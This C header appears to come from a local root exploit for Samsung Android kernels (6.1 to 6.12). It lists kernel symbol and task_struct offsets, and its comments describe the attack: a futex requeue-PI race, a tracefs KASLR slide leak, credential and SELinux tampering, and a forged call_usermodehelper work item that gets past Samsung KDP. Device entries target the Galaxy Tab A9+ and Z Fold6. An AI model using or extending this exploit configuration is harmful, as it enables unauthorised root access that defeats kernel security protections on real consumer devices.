#ifndef OFFSETS_H
#define OFFSETS_H

#include <stdint.h>

struct kernel_offsets {
  const char *uname_r;
  /* Bootloader-selected physical load address; 0 uses target.h. */
  uint64_t kernel_phys_load;
  /* pselect fd_set waiter word shift; 0 uses target.h default. */
  int pselect_waiter_shift;
  uint64_t off_init_task, off_init_cred;
  uint64_t off_root_task_group, off_selinux_enforcing;
  uint64_t off_selinux_blob_sizes, off_security_hook_heads, off_kmalloc_caches;
  uint64_t off_anon_pipe_buf_ops, off_ashmem_misc_fops, off_ashmem_fops;
  uint64_t off_ashmem_ioctl, off_ashmem_compat_ioctl, off_ashmem_mmap;
  uint64_t off_ashmem_open, off_ashmem_release, off_ashmem_show_fdinfo;
  uint64_t off_configfs_read_iter, off_configfs_bin_write_iter;
  uint64_t off_copy_splice_read, off_noop_llseek;
  uint64_t off_slide_nfulnl_logger, off_slide_loggers_0_1, off_slide_boot_id;

  /* Per-kernel struct offsets; 0 uses target.h defaults. */
  uint32_t task_prio, task_normal_prio, task_sched_task_group;
  uint32_t task_pi_lock, task_pi_waiters, task_pi_top_task, task_pi_blocked_on;
  uint32_t task_pid, task_tgid, task_atomic_flags;
  uint32_t task_real_cred, task_cred, task_comm, task_tasks, task_seccomp;

  /* Kernel-family base addresses and layouts; 0 uses target.h/common.h. */
  uint64_t kimage_text_base, vmemmap_start;
  int64_t skb_data_delta;
  uint32_t mm_struct_sz, page_slab_cache;
  uint32_t fops_ioctl, fops_compat_ioctl, fops_mmap, fops_open;
  uint32_t fops_release, fops_splice_read, fops_show_fdinfo;
  uint32_t cred_uid, cred_securebits, cred_caps, cred_security;
  /* 1: 6.1 compact rt_mutex_waiter (0x58, packed wake_state+prio);
   * 0: 6.6+ augmented layout (0x70). */
  int waiter_compact;

  /* Samsung tracefs slide leak (sched_blocked_reason).  tracefs_leak=1
   * requires the leak to succeed before any write (a wrong physical slide
   * misdirects them); 0 assumes a zero KASLR slide. */
  int tracefs_leak;
  uint32_t tracefs_event_id;
  uint64_t tracefs_caller_off;

  /* 1: root via a forged system_unbound_wq work item running
   * call_usermodehelper_exec_work (avoids KDP_CRED-protected cred writes);
   * requires off_call_usermodehelper_exec_work / off_system_unbound_wq. */
  int umh_root;
  uint64_t off_call_usermodehelper_exec_work, off_system_unbound_wq;
  /* ctl_table slot whose data pointer is &sysctl_bootid; 0 means
   * off_slide_boot_id already denotes it (folded layout). */
  uint64_t off_slide_sysctl_bootid;

  /* 1: use the EDEADLK-synchronized route (three-thread
   * handshake, CMP_REQUEUE_PI retried until EDEADLK, single precisely
   * timed sched_setattr punch, pselect6 with a 100ms timeout). */
  int sync_route;

  /* Consumer punch tuning; 0 uses the defaults (core CONSUMER_CORE, one
   * sched_setattr per route).  Harder races (e.g. Samsung 6.1) need the
   * consumer pinned to a big core punching every few ms. */
  int consumer_core;
  int consumer_max_calls;
  int consumer_call_interval_usec;
};

#define OFFSETS_ENTRY(uname, ...) { .uname_r = uname, __VA_ARGS__ }

#define STRUCT_OFFSETS_6_12                                                    \
  .task_prio = 0x94, .task_normal_prio = 0x9C, .task_sched_task_group = 0x420, \
  .task_pi_lock = 0x9EC, .task_pi_waiters = 0xA00,                             \
  .task_pi_top_task = 0xA10, .task_pi_blocked_on = 0xA18,                      \
  .task_pid = 0x708, .task_tgid = 0x70C,                                       \
  .task_atomic_flags = 0x6C8, .task_real_cred = 0x8F8, .task_cred = 0x900,     \
  .task_comm = 0x910, .task_tasks = 0x638, .task_seccomp = 0x9C8

#define STRUCT_OFFSETS_6_6                                                     \
  .task_prio = 0x84, .task_normal_prio = 0x8C, .task_sched_task_group = 0x348, \
  .task_pi_lock = 0x90C, .task_pi_waiters = 0x920,                             \
  .task_pi_top_task = 0x930, .task_pi_blocked_on = 0x938,                      \
  .task_pid = 0x618, .task_tgid = 0x61C,                                       \
  .task_atomic_flags = 0x5D8, .task_real_cred = 0x818, .task_cred = 0x820,     \
  .task_comm = 0x830, .task_tasks = 0x550, .task_seccomp = 0x8E8

#define STRUCT_OFFSETS_6_1                                                     \
  .task_prio = 0x84, .task_normal_prio = 0x8C, .task_sched_task_group = 0x348, \
  .task_pi_lock = 0x924, .task_pi_waiters = 0x938,                             \
  .task_pi_top_task = 0x948, .task_pi_blocked_on = 0x950,                      \
  .task_pid = 0x630, .task_tgid = 0x634,                                       \
  .task_atomic_flags = 0x5F0, .task_real_cred = 0x830, .task_cred = 0x838,     \
  .task_comm = 0x848, .task_tasks = 0x550, .task_seccomp = 0x900

static const struct kernel_offsets known_offsets[] = {
/* Add a new verified device by creating src/devices/<name>/offsets.h. */
#include "gta9p/offsets.h"
#include "zfold6/offsets.h"
  { .uname_r = NULL }
};

#endif
